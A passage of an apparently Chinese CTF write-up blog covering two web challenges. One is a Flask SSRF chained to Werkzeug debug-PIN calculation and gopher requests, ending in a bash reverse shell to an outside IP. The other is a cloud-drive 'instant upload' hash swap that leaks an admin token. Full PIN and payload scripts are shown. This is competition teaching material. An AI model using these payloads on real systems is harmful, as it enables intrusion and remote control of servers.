class="number">22</span>  <span class="number">2021</span> lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">9</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> lib32 -&gt; usr/lib32</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">9</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> lib64 -&gt; usr/lib64</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root  <span class="number">10</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> libx32 -&gt; usr/libx32</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> media</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> mnt</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> opt</span><br><span class="line">dr-xr-xr-x <span class="number">3110</span> root root   <span class="number">0</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> proc</span><br><span class="line">drwx------    <span class="number">1</span> root root  <span class="number">20</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">52</span> root</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">21</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">50</span> run</span><br><span class="line">lrwxrwxrwx    <span class="number">1</span> root root   <span class="number">8</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x    <span class="number">2</span> root root   <span class="number">6</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> srv</span><br><span class="line">-rwx------    <span class="number">1</span> root root <span class="number">241</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">52</span> start.<span class="property">sh</span></span><br><span class="line">dr-xr-xr-x   <span class="number">13</span> root root   <span class="number">0</span> <span class="title class_">Sep</span> <span class="number">19</span> <span class="number">01</span>:<span class="number">23</span> sys</span><br><span class="line">drwxrwxrwt    <span class="number">1</span> root root   <span class="number">6</span> <span class="title class_">Oct</span> <span class="number">22</span> <span class="number">15</span>:<span class="number">23</span> tmp</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">19</span> <span class="title class_">Nov</span> <span class="number">22</span>  <span class="number">2021</span> usr</span><br><span class="line">drwxr-xr-x    <span class="number">1</span> root root  <span class="number">17</span> <span class="title class_">Oct</span> <span class="number">19</span> <span class="number">15</span>:<span class="number">49</span> <span class="keyword">var</span></span><br></pre></td></tr></table></figure>

<p>那么通过file伪协议去读取文件<code>?url=file://127.0.0.1/app.py&amp;lolita[]=1</code></p>
<p>app.py</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os, base64</span><br><span class="line">#<span class="keyword">from</span> <span class="title class_">NeepuF1Le</span> <span class="keyword">import</span> neepu_files</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line">app.<span class="property">config</span>[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;******&#x27;</span></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_">welcome</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;islogin&quot;</span>] == <span class="title class_">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;***********************&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">run</span>(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1314</span>, debug=<span class="title class_">True</span>)<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>可以看到我们要么能获取key伪造session 但是同时我们还得有地方去调用这个welcome函数才行</p>
<p>仔细观察它的debug是开启的 并且我们还可以读文件 那么一眼就知道是要去算pin码然后rce了 前面的内容只是噱头</p>
<p>计算pin码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  # /etc/passwd</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  # 默认值</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  # 默认值</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27;</span>  # 报错得到</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;112581235869047&#x27;</span>,  # /sys/<span class="keyword">class</span>/net/eth0/address 十进制</span><br><span class="line">    <span class="string">&#x27;8cab9c97-85be-4fb4-9d17-29335d7b2b8adocker-97ec80f5ebf7d07c5c79a4b57dd84c58bb32c866b6e3aed76ef252d246a07dc3.scope&#x27;</span></span><br><span class="line">    #8cab9c97-85be-4fb4-9d17-29335d7b2b8a</span><br><span class="line">    #docker-97ec80f5ebf7d07c5c79a4b57dd84c58bb32c866b6e3aed76ef252d246a07dc3.<span class="property">scope</span></span><br><span class="line">    # 字符串合并：<span class="number">1.</span>/etc/machine-<span class="title function_">id</span>(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id <span class="number">2.</span> /proc/self/cgroup</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 下面为源码里面抄的，不需要修改</span><br><span class="line">h = hashlib.<span class="title function_">sha1</span>()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> <span class="title function_">chain</span>(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> not <span class="attr">bit</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="title function_">isinstance</span>(bit, str):</span><br><span class="line">        bit = bit.<span class="title function_">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.<span class="title function_">update</span>(bit)</span><br><span class="line">h.<span class="title function_">update</span>(b<span class="string">&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.<span class="title function_">hexdigest</span>()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="title class_">None</span></span><br><span class="line"><span class="keyword">if</span> num is <span class="title class_">None</span>:</span><br><span class="line">    h.<span class="title function_">update</span>(b<span class="string">&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="title function_">int</span>(h.<span class="title function_">hexdigest</span>(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="title class_">None</span></span><br><span class="line"><span class="keyword">if</span> rv is <span class="title class_">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="title function_">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.<span class="title function_">join</span>(num[<span class="attr">x</span>:x + group_size].<span class="title function_">rjust</span>(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">0</span>, <span class="title function_">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="attr">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(rv)</span><br></pre></td></tr></table></figure>

<p>这里关于<code>/proc/self/cgroup</code>这里的内容和我们一般做题时获取的不太一样 不过记住一点就行了</p>
<p><code>取第一行的最后一个斜杠/后面的所有字符串</code>那么肯定是对的</p>
<p>计算得pin码 <code>397-838-235</code></p>
<p>接下来的思路就是 要通过gopher协议去访问内网中<code>/console</code>路由并且进行RCE</p>
<p>但是由于debugmode的rce需要携带cookie 所以我们还需要去计算cookie</p>
<p>因为<code>/console</code>是在内网的1314端口中 所以我们没法直接通过浏览器进入debug的控制台</p>
<p>这里就需要手算cookie了</p>
<p>方法参考：<a target="_blank" rel="noopener" href="https://unk.icu/2023/06/19/flask-pin/">flask-pin</a>  神！[SCTF2023 Web WriteUp - Boogiepop Doesn’t Laugh](<a target="_blank" rel="noopener" href="https://boogipop.com/2023/06/20/SCTF2023">https://boogipop.com/2023/06/20/SCTF2023</a> Web WriteUp&#x2F;)</p>
<p>发送验证pin码的请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?__debugger__=yes&amp;cmd=pinauth&amp;pin=397-838-235&amp;s=hCYJBiBvCDHEJqflrGtk</span><br></pre></td></tr></table></figure>

<p>需要拿到s 直接访问&#x2F;console 可以在源代码中拿到</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483592278-60ae86c4-b0cb-4206-8cf7-23eae59b1225.png" alt="img"></p>
<p>然后记得编码打入<code>?url=http://127.0.0.1:1314/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=397-838-235&amp;s=hCYJBiBvCDHEJqflrGtk&amp;lolita[]=1</code> 验证pin码计算正确的</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698483692006-fad9b10a-ab71-43e3-b358-5586d7458a08.png" alt="img"></p>
<p>然后我们要进行rce还需要携带cookie</p>
<h3 id="第一种方式-脚本计算"><a href="#第一种方式-脚本计算" class="headerlink" title="第一种方式 脚本计算"></a>第一种方式 脚本计算</h3><p>需要计算cookie 这里直接用到一个现成的脚本：<a target="_blank" rel="noopener" href="https://github.com/WiIs0n/Flask-cookie-generation-based-on-PIN-code">GitHub - WiIs0n&#x2F;Flask-cookie-generation-based-on-PIN-code: This script generates a Cookie based on a legitimate PIN code.</a></p>
<p>同时可以计算出pin和cookie</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698484036732-b9d7526a-ee26-4ba4-be46-a4cf5797e8c0.png" alt="img"></p>
<h3 id="第二种方式gopher发包"><a href="#第二种方式gopher发包" class="headerlink" title="第二种方式gopher发包"></a>第二种方式gopher发包</h3><p>利用gopher协议发包 通过返回包获取到cookie</p>
<p>脚本如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">parse</span></span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">request</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">PAYLOAD</span>(s,cmd,host,pin):</span><br><span class="line"></span><br><span class="line">    poc = f<span class="string">&quot;&quot;</span><span class="string">&quot;GET /console?&amp;__debugger__=yes&amp;pin=&#123;pin&#125;&amp;cmd=&#123;cmd&#125;&amp;frm=0&amp;s=&#123;s&#125; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: &#123;host&#125;</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    new_poc = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(poc).<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">    res = f<span class="string">&#x27;gopher://&#123;host&#125;/_&#x27;</span> + new_poc</span><br><span class="line">    <span class="title function_">print</span>(res)</span><br><span class="line">    <span class="keyword">return</span> urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;pinauth&quot;</span></span><br><span class="line">s= <span class="string">&quot;hCYJBiBvCDHEJqflrGtk&quot;</span></span><br><span class="line">host=<span class="string">&quot;127.0.0.1:1314&quot;</span></span><br><span class="line">#cookie = <span class="string">&quot;__wzdaa31f34934bb24e966f6=1698068595|d4af8efd2a4d&quot;</span></span><br><span class="line">pin = <span class="string">&quot;397-838-235&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="title function_">PAYLOAD</span>(s,cmd,host,pin)</span><br><span class="line"><span class="title function_">print</span>(a)</span><br></pre></td></tr></table></figure>

<p>可见我们通过脚本计算出来的 cookie也是正确的</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485116132-4b195cc5-160e-4156-be43-10df30b6fe65.png" alt="img"></p>
<p>计算出cookie之后就不用携带pin了 携带cookie直接rce即可</p>
<p>直接反弹shell 记得url编码一下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">parse</span></span><br><span class="line"><span class="keyword">import</span> urllib.<span class="property">request</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">PAYLOAD</span>(s,cmd,host,cookie):</span><br><span class="line"></span><br><span class="line">    poc = f<span class="string">&quot;&quot;</span><span class="string">&quot;GET /console?&amp;__debugger__=yes&amp;cmd=&#123;cmd&#125;&amp;frm=0&amp;s=&#123;s&#125; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: &#123;host&#125;</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Cookie: &#123;cookie&#125;</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    new_poc = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(poc).<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">    res = f<span class="string">&#x27;gopher://&#123;host&#125;/_&#x27;</span> + new_poc</span><br><span class="line">    <span class="title function_">print</span>(res)</span><br><span class="line">    <span class="keyword">return</span> urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(res)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.130.34.53%2F7777%20%3C%261%5C%22%22)&#x27;</span></span><br><span class="line">s= <span class="string">&quot;hCYJBiBvCDHEJqflrGtk&quot;</span></span><br><span class="line">host=<span class="string">&quot;127.0.0.1:1314&quot;</span></span><br><span class="line">cookie = <span class="string">&quot;__wzd41acf1cefa50cf0ead64=1698485090|9b48530259cc&quot;</span></span><br><span class="line">pin = <span class="string">&quot;397-838-235&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="title function_">PAYLOAD</span>(s,cmd,host,cookie)</span><br><span class="line"><span class="title function_">print</span>(a)</span><br></pre></td></tr></table></figure>

<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485894959-0305c6d9-dc23-41b2-987e-74979132cf72.png" alt="img"></p>
<p>成功！！！</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698485737899-0a1ec05c-caea-4355-b599-bc7798a61086.png" alt="img"></p>
<h2 id="NextDrive"><a href="#NextDrive" class="headerlink" title="NextDrive"></a>NextDrive</h2><p>最折磨出题人的一集</p>
<p>趣味题目</p>
<p>一个模拟百度网盘的题目</p>
<p>首先申请一个账号然后登录</p>
<p>根据提示</p>
<p>Hint2: 你知道秒传的原理吗？</p>
<p>那么首先了解一下秒传的原理</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1698486990058-e84113fd-3c61-496c-84d6-f1b3a796fc9d.png" alt="img"></p>
<p>在公共资源区能找到test.res.http文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">HTTP</span>/<span class="number">1.1</span> <span class="number">200</span> <span class="variable constant_">OK</span></span><br><span class="line">content-<span class="attr">type</span>: application/json; charset=utf-<span class="number">8</span></span><br><span class="line">content-<span class="attr">length</span>: <span class="number">50</span></span><br><span class="line"><span class="attr">date</span>: <span class="title class_">Tue</span>, <span class="number">06</span> <span class="title class_">Oct</span> <span class="number">2023</span> <span class="number">13</span>:<span class="number">39</span>:<span class="number">21</span> <span class="variable constant_">GMT</span></span><br><span class="line"><span class="attr">connection</span>: keep-alive</span><br><span class="line">keep-<span class="attr">alive</span>: timeout=<span class="number">5</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>:<span class="string">&quot;success&quot;</span>,<span class="string">&quot;logged&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;data&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">27471829</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486253740</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;すずめ feat.十明 - RADWIMPS,十明.flac&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Windows 12 Concept.png&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;469db0f38ca0c07c3c8726c516e0f967fa662bfb6944a19cf4c617b1aba78900&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">440707</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486256209</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;Windows 12 Concept.png&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;03dff115bc0d6907752796fc808fe2ef0b4ea9049b5a92859fd7017d4e96c08f&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">330767</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486256242</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;信息安全技术信息安全事件分类分级指南.pdf&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;不限速，就是快！.jpg&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;2de8696b9047f5cf270f77f4f00756be985ebc4783f3c553a77c20756bc68f2e&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">32920</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486256280</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;不限速，就是快！.jpg&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;09228aabeb472316022cedd3f1a76930558f0ea489bd65b32ba743e499b74182&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">1085</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486259714</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到是发包数据包 </p>
<p>注意到还有一个test.req.http上传了但是文件没有显示出来</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>,<span class="string">&quot;hash&quot;</span>:<span class="string">&quot;09228aabeb472316022cedd3f1a76930558f0ea489bd65b32ba743e499b74182&quot;</span>,<span class="string">&quot;size&quot;</span>:<span class="number">1085</span>,<span class="string">&quot;uploader&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uploader_uid&quot;</span>:<span class="string">&quot;100000&quot;</span>,<span class="string">&quot;shareTime&quot;</span>:<span class="number">1698486259714</span>,<span class="string">&quot;isYours&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;isOwn&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;ownFn&quot;</span>:<span class="string">&quot;test.req.http&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们可以利用秒传的原理随便上传一个文件 下载时替换test.req.http的哈希值 那么就可以将test.req.http文件下载下来了</p>
<p>得到</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /api/info/drive/sharezone <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Accept</span>: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span></span><br><span class="line"><span class="comment">Cache-Control: no-cache</span></span><br><span class="line"><span class="comment">Connection: keep-alive</span></span><br><span class="line"><span class="comment">Content-Length: 0</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Cookie: uid=100000; token=eyJ1c2VybmFtZSI6ImFkbWluIiwidWlkIjoiMTAwMDAwIiwidG9rZW4iOiI5ODRkMTIyMDQ5YmExNTM2MmYzNTEyZWYyNmE5YzUyMGY2NzBiYzNjYjJiMzhiODRhZWU0NzAzNDAwMzg2MWM3In0uCQ9dVhxMfi1WChcEdxJoYQ.TA1XZ2MKFgcQRRRmW18PDEAJUmBgDURXEUFFMAwJWloQXVIybl9BUkFBFTVbC1YOQgxWZmVcFldHQRZnWgMLUkJdVmZnW0lUTBNPMFsOVwlGClY2YlZCVEFARjVRCwtTQ11Wb2ZcSVJCE09iWlgIXUxcUDQyXBUHRkBPY1gDWF8</span></span><br><span class="line"><span class="comment">Host: localhost:21920</span></span><br><span class="line"><span class="comment">Origin: http://localhost:21920</span></span><br><span class="line"><span class="comment">Pragma: no-cache</span></span><br><span class="line"><span class="comment">Referer: http://localhost:21920/sharezone</span></span><br><span class="line"><span class="comment">Sec-Fetch-Dest: empty</span></span><br><span class="line"><span class="comment">Sec-Fetch-Mode: cors</span></span><br><span class="line"><span class="comment">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0</span></span><br><span class="line"><span class="comment">sec-ch-ua: &quot;Microsoft Edge&quot;;v=&quot;119&quot;, &quot;Chromium&quot;;v=&quot;119&quot;, &quot;Not?A_Brand&quot;;v=&quot;24&quot;</span></span><br><span class="line"><span class="comment">sec-ch-ua-mobile: ?0</span></span><br><span class="line"><span class="comment">sec-ch-ua-platform: &quot;Windows&quot;</span></span><br></pre></td></tr></table></figure>

<p>那么我们就拿到了admin的token了 然后替换token伪造身份</p>
<p>又多了点文件 不过重要的是share.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 